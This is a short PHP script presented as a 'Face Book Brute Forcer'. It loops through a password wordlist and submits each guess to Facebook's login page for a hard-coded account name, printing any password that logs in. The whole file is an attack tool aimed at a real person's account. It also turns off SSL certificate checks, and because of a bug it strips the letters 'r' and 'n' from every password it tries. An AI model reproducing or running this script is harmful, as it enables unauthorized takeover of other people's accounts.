<?php
################################
# Face Book Brute Forcer
################################
set_time_limit(0);
$username ="piyushsrivastava0"; // username to brute force
$dictionary ="wordlist.txt"; // need dictionary to password list

function kontrol($kullaniciadi,$sifre)
{
	$useragent = "Opera/9.21 (Windows NT 5.1; U; tr)";
	$data = "email=$kullaniciadi&pass=$sifre&login=Login" ;
	$ch = curl_init('https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php');
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	$source=curl_exec ($ch);
	curl_close ($ch);
	if(eregi("Home",$source)){return true;} else {return false;}

}

if(!is_file($dictionary))
	{
		echo "$dictionary is not file";exit;
	}
$lines=file($dictionary);
echo "Attack Starting..";
sleep(10);
echo "Attack Started, brute forcing..";
foreach($lines as $line)
{
	$line=str_replace("r","",$line);
	$line=str_replace("n","",$line);
	if(kontrol($username,$line))
	{
		echo "[+] username:$username , password:$line – Password found : $line";
		$fp=fopen('cookie.txt','w');
		fwrite($fp,'');
		exit;
	}
	else
	{
		echo "[-] username:$username , password:$line – Password not found :$line";
	}
}
?>